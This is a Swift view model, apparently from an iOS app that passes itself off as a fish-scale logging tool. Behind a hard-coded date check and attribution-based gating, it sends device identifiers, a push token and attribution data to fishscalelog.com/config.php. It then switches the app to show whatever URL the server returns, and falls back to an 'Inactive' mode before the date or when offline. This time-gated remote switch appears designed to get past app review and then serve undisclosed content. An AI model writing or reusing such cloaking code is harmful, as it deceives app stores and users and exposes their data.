import Foundation
import UserNotifications
import SwiftUI
import FirebaseMessaging
import Firebase
import Network
import AppsFlyerLib
import Combine

enum LogPhase {
    case bootstrapping, operational, deprecated, unreachable
}

class LogSupervisorViewModel: ObservableObject {
    @Published var ongoingLogPhase: LogPhase = .bootstrapping
    @Published var logDestination: URL?
    @Published var revealConsentDialog = false
    
    private var acquisitionMetrics: [String: Any] = [:]
    private var entryPointMetrics: [String: Any] = [:]
    private var disposers = Set<AnyCancellable>()
    private let linkageScanner = NWPathMonitor()
    
    private let appStateRepo: AppStateRepository
    private let permissionRepo: PermissionRepository
    private let deviceRepo: DeviceInfoRepository
    
    init(appStateRepo: AppStateRepository = AppStateRepositoryImpl(),
         permissionRepo: PermissionRepository = PermissionRepositoryImpl(),
         deviceRepo: DeviceInfoRepository = DeviceInfoRepositoryImpl()) {
        
        self.appStateRepo = appStateRepo
        self.permissionRepo = permissionRepo
        self.deviceRepo = deviceRepo
        
        initializeLinkageScanner()
        initializeFallbackTimer()
    }
    
    deinit {
        linkageScanner.cancel()
    }
    
    func manageAcquisitionMetrics(_ metrics: [String: Any]) {
        acquisitionMetrics = metrics
        revisePhase()
    }
    
    func manageEntryPointMetrics(_ metrics: [String: Any]) {
        entryPointMetrics = metrics
    }
    
    private func initializeFallbackTimer() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 30.0) {
            if self.acquisitionMetrics.isEmpty && self.entryPointMetrics.isEmpty && self.ongoingLogPhase == .bootstrapping {
                self.activateDeprecated()
                self.designatePhase(.deprecated)
            }
        }
    }
    
    private func isOperationalPeriod() -> Bool {
        let dateElements = DateComponents(year: 2026, month: 1, day: 12)
        guard let thresholdDate = Calendar.current.date(from: dateElements) else { return false }
        return Date() >= thresholdDate
    }
    
    @objc private func revisePhase() {
        checkOperationalValidity()
    }
    
    private func checkOperationalValidity() {
        guard isOperationalPeriod() else {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                self.activateDeprecated()
                self.designatePhase(.deprecated)
            }
            return
        }
        handleMetricsPresence()
    }
    
    private func handleMetricsPresence() {
        guard !acquisitionMetrics.isEmpty else {
            loadCachedDestination()
            return
        }
        checkAppCondition()
    }
    
    private func checkAppCondition() {
        guard appStateRepo.retrieveAppCondition() != "Inactive" else {
            activateDeprecated()
            designatePhase(.deprecated)
            return
        }
        evaluateAndProceed()
    }
    
    private func evaluateAndProceed() {
        let assessedPhase = evaluatePhase()
        if assessedPhase == .bootstrapping && appStateRepo.isInitialExecution {
            commenceBootstrapping()
            return
        }
        handleProvisionalURL()
    }
    
    private func evaluatePhase() -> LogPhase {
        if acquisitionMetrics.isEmpty { return .deprecated }
        if appStateRepo.retrieveAppCondition() == "Inactive" { return .deprecated }
        if appStateRepo.isInitialExecution && (acquisitionMetrics["af_status"] as? String == "Organic") { return .bootstrapping }
        if UserDefaults.standard.string(forKey: "temp_url") != nil { return .operational }
        return .bootstrapping
    }
    
    private func handleProvisionalURL() {
        guard let provisionalStr = UserDefaults.standard.string(forKey: "temp_url"),
              let provisionalDest = URL(string: provisionalStr),
              logDestination == nil else {
            checkDestinationPresence()
            return
        }
        logDestination = provisionalDest
        designatePhase(.operational)
    }
    
    private func checkDestinationPresence() {
        guard logDestination == nil else { return }
        if checkConsentNeed() {
            revealConsentDialog = true
        } else {
            invokeConfigAcquisition()
        }
    }
    
    private func checkConsentNeed() -> Bool {
        guard !permissionRepo.isConsentApproved(), !permissionRepo.isConsentDeclined() else { return false }
        if let prior = permissionRepo.retrieveFinalConsentTime(), Date().timeIntervalSince(prior) < 259200 { return false }
        return true
    }
    
    func manageConsentSkip() {
        permissionRepo.updateFinalConsentTime(Date())
        revealConsentDialog = false
        invokeConfigAcquisition()
    }
    
    func manageConsentApproval() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] consented, _ in
            DispatchQueue.main.async {
                guard let self else { return }
                self.permissionRepo.approveConsent(consented)
                if !consented {
                    self.permissionRepo.declineConsent(true)
                }
                if consented {
                    UIApplication.shared.registerForRemoteNotifications()
                }
                self.revealConsentDialog = false
                if self.logDestination != nil {
                    self.designatePhase(.operational)
                } else {
                    self.invokeConfigAcquisition()
                }
            }
        }
    }
    
    private func commenceBootstrapping() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            Task { [weak self] in
                await self?.acquireOrganicMetrics()
            }
        }
    }
    
    private func designatePhase(_ phase: LogPhase) {
        ongoingLogPhase = phase
    }
    
    private func initializeLinkageScanner() {
        linkageScanner.pathUpdateHandler = { [weak self] path in
            if path.status != .satisfied {
                DispatchQueue.main.async {
                    guard let self else { return }
                    if self.appStateRepo.retrieveAppCondition() == "LogView" {
                        self.designatePhase(.unreachable)
                    } else {
                        self.activateDeprecated()
                        self.designatePhase(.deprecated)
                    }
                }
            }
        }
        linkageScanner.start(queue: .global())
    }
    
    private func acquireOrganicMetrics() async {
        do {
            let unified = try await performOrganicRetrieval()
            acquisitionMetrics = unified
            invokeConfigAcquisition()
        } catch {
            activateDeprecated()
            designatePhase(.deprecated)
        }
    }
    
    private func performOrganicRetrieval() async throws -> [String: Any] {
        let assembler = DestinationAssembler()
            .configureProgramId(SetupConfig.flyerProgramId)
            .configureAuthKey(SetupConfig.flyerAuthKey)
            .configureHardwareId(deviceRepo.retrieveUniqueTracker())
        guard let attrDest = assembler.compile() else { throw LogFault.destinationAssemblyError }
        let (info, reply) = try await URLSession.shared.data(from: attrDest)
        guard let httpReply = reply as? HTTPURLResponse, httpReply.statusCode == 200 else { throw LogFault.replyValidationError }
        guard let parsed = try? JSONSerialization.jsonObject(with: info) as? [String: Any] else { throw LogFault.infoParsingError }
        var unified = parsed
        for (k, v) in entryPointMetrics where unified[k] == nil { unified[k] = v }
        return unified
    }
    
    private func invokeConfigAcquisition() {
        Task { [weak self] in
            do {
                guard let self else { return }
                let acquiredDest = try await self.performConfigRetrieval()
                let destStr = acquiredDest.absoluteString
                self.saveFetchedDestination(destinationStr: destStr, resolvedDest: acquiredDest)
                if self.checkConsentNeed() {
                    self.logDestination = acquiredDest
                    self.revealConsentDialog = true
                } else {
                    self.logDestination = acquiredDest
                    self.designatePhase(.operational)
                }
            } catch {
                self?.handleConfigFailure()
            }
        }
    }
    
    private func performConfigRetrieval() async throws -> URL {
        let setupDest = URL(string: "https://fishscalelog.com/config.php")!
        let setupData = buildSetupPayload()
        let setupBody = try JSONSerialization.data(withJSONObject: setupData)
        let setupReq = buildSetupRequest(url: setupDest, body: setupBody)
        let (info, _) = try await URLSession.shared.data(for: setupReq)
        return try extractDestination(from: info)
    }
    
    private func buildSetupPayload() -> [String: Any] {
        var setupData = acquisitionMetrics
        setupData["os"] = "iOS"
        setupData["af_id"] = deviceRepo.retrieveUniqueTracker()
        setupData["bundle_id"] = deviceRepo.retrievePackageIdentifier()
        setupData["firebase_project_id"] = deviceRepo.retrieveCloudSender()
        setupData["store_id"] = deviceRepo.retrieveMarketIdentifier()
        setupData["push_token"] = deviceRepo.retrieveAlertToken()
        setupData["locale"] = deviceRepo.retrieveLocaleCode()
        return setupData
    }
    
    private func buildSetupRequest(url: URL, body: Data) -> URLRequest {
        var setupReq = URLRequest(url: url)
        setupReq.httpMethod = "POST"
        setupReq.setValue("application/json", forHTTPHeaderField: "Content-Type")
        setupReq.httpBody = body
        return setupReq
    }
    
    private func extractDestination(from info: Data) throws -> URL {
        guard let parsed = try? JSONSerialization.jsonObject(with: info) as? [String: Any],
              let valid = parsed["ok"] as? Bool, valid,
              let destStr = parsed["url"] as? String,
              let dest = URL(string: destStr) else {
            throw LogFault.infoParsingError
        }
        return dest
    }
    
    private func saveFetchedDestination(destinationStr: String, resolvedDest: URL) {
        appStateRepo.persistDestination(destinationStr)
        appStateRepo.assignAppCondition("LogView")
        appStateRepo.logExecutionCompleted()
    }
    
    private func handleConfigFailure() {
        if let cachedDest = appStateRepo.retrieveStoredDestination() {
            logDestination = cachedDest
            designatePhase(.operational)
        } else {
            activateDeprecated()
            designatePhase(.deprecated)
        }
    }
    
    private func loadCachedDestination() {
        if let cachedDest = appStateRepo.retrieveStoredDestination() {
            logDestination = cachedDest
            designatePhase(.operational)
        } else {
            activateDeprecated()
            designatePhase(.deprecated)
        }
    }
    
    private func activateDeprecated() {
        appStateRepo.assignAppCondition("Inactive")
        appStateRepo.logExecutionCompleted()
    }
}

enum LogFault: Error {
    case destinationAssemblyError
    case replyValidationError
    case infoParsingError
    case dataSerializationError
}
